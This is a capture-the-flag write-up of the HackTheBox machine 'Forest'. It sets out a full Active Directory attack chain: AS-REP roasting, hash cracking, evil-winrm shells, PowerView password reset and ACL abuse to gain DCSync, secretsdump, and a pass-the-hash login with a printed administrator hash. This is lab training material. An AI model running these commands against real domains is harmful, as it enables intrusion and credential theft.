[Forest](https://www.hackthebox.eu/home/machines/profile/212) is an easy rated windows box on hackthebox by  [egre55](https://www.hackthebox.eu/home/users/profile/1190) and [mrb3n](https://www.hackthebox.eu/home/users/profile/2984). Valid domain users are enumerated using ldapsearch as well as rpcclient and one of the users has Pre Auth enabled giving us hash for that user which was cracked using hashcat and the credentials were used to get shell on the DC. The compromised user has full ownership on another user which was abused to change the password for the other user tick. User tick has writedacl privilege over the domain which was used to give DCsync privilege to user tick. With dcsync privilege all the secrets were dumped on the local machine and the NTLM hash for administrator user was used to get shell on the box as administrator.

```
- DNS(53), LDAP(389) and kerberos(88) indicate that this is a active directory domain controller.
- We get the domain name: **htb.local**. So, let us add that to our `/etc/hosts`.
- We also get the FQDN for the DC: **Forest.htb.local**.

Anonymous login is enabled, but no shares were present.

## Trying to go a little deeper and list the contents of the DN

And we are able to extract quite a lot of information from the LDAP server without any credentials.


## Trying to get a list of users on the domain
![image](/assets/images/htb-boxes/forest/Pasted image 20210704130437.png)

We can also get the users using rpcclient.

## Testing if preauth is enabled for any users
Since we have a bunch of usernames, we can check if any user has preauth enabled before trying to bruteforce the password.

### What is preauth and how it works
-   While requesting the TGT(ticket granting ticket), on the first step the requesting party(user) encrypts the timestamp with its own NTLM hash and sends it to the KDC(key distribution centre) which is the Domain Controller. Now if the KDC successfully decrypts the timestamp with the requesting user's NTLM hash, KDC will know the requesting user is a valid one.
-   This checks can be disabled(which is not a default case). In such case the KDC does not verify if the user asking for the TGT is a valid one and it sends back the TGT to the requester.
-   This TGT contains some portion of data which is encrypted with the requesting user's NTLM hash which means we can take the hash offline and try to crack it.


### Using impacket for checking
![image](/assets/images/htb-boxes/forest/Pasted image 20210704130656.png)
We get a hash for `svc-alfresco` and for all the other users, preauth is disabled.

## Trying to crack the hash
![image](/assets/images/htb-boxes/forest/Pasted image 20210704130822.png)
And we crack the hash successfully.

## Checking with cme
![image](/assets/images/htb-boxes/forest/Pasted image 20210704130935.png)
It says pwned which means we can get a shell using evil-winrm.

## Getting a shell
```console
reddevil@ubuntu:~/Documents/htb/retired/forrest$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice

Evil-WinRM shell v2.3

```

## Reading user.txt
```console
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> type user.txt

# Privilege Escalation
We can manually enumerate the domain using powerview, but i like to upload the ingestor for bloodhound called sharphound, which will collect all the information and we can view the information very easily on the Bloodhound.

## Uploading Sharphound
```console
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> upload sharp.ps1
Info: Uploading sharp.ps1 to C:\Users\svc-alfresco\desktop\sharp.ps1

                                                             
Data: 1298980 bytes of 1298980 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> . .\sharp.ps1
```
We upload the script and load it into the memory.

## Collecting the data
```console
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> Invoke-Bloodhound -collectionmethod all -zipfile test
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> dir


    Directory: C:\Users\svc-alfresco\desktop

## Downloading the zip
```console
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> download 20210704003952_test.zip
Info: Downloading C:\Users\svc-alfresco\desktop\20210704003952_test.zip to 20210704003952_test.zip

```

## Loading the data in Bloodhound
![image](/assets/images/htb-boxes/forest/Pasted image 20210704132452.png)
Looking at the graph, our user owns the user tick@htb.local. 

Bloodhound also gives us info on how we can abuse this privilege.
![image](/assets/images/htb-boxes/forest/Pasted image 20210704132546.png)

## Changing password of user tick
![image](/assets/images/htb-boxes/forest/Pasted image 20210704132807.png)
It suggests that we should powerview to change the password. So, let us upload the powerview and load it on the memory.

## Uploading powerview
```console
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> upload powerview.ps1
Info: Uploading powerview.ps1 to C:\Users\svc-alfresco\desktop\powerview.ps1

                                                             
Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> . .\powerview.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> 
```

## Executing commands to change the password of user task
I like to take reference from [this](https://github.com/aniqfakhrul/archives) amazing repo by [aniqfakhrul](https://twitter.com/aniqfakhrul) when it comes to abusing permissions on Active Directory.
```console
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> Set-DomainUserPassword -Identity tick -AccountPassword (ConvertTo-SecureString -AsPlainText -Force 'P@$$w0rd!')
```
And we successfully changed the password for user tick.


## Getting a shell as user tick
```console
reddevil@ubuntu:~/Documents/htb/retired/forrest$ evil-winrm -i 10.10.10.161 -u tick -p 'P@$$w0rd!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tick\Documents>
```

## Back to the Bloodhound
![image](/assets/images/htb-boxes/forest/Pasted image 20210704133550.png)
We can see that the compromised user tick is a memeber of group Exchange Windows Permissions and the group has writedacl privileges over the whole domain.

![image](/assets/images/htb-boxes/forest/Pasted image 20210704133810.png)
And from the help we can see that with writedacl, we can give ourself permission for DCSync.

## Giving ourself permission for DCSync
```console
*Evil-WinRM* PS C:\Users\tick\Documents> Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity tick -Rights DCSync
*Evil-WinRM* PS C:\Users\tick\Documents> 
```
- With DCsync we can either run mimikatz on the windows box or secretsdump on our linux box to dump all the secrets present on the domain controller which includes NTLM hashes which we can use to login onto the box.

## Running secretsdump from impacket
![image](/assets/images/htb-boxes/forest/Pasted image 20210704134529.png)
We get the NTLM hash for all the accounts on the domain.

## Getting shell using evil-winrm
```console
reddevil@ubuntu:~/Documents/htb/retired/forrest$ evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
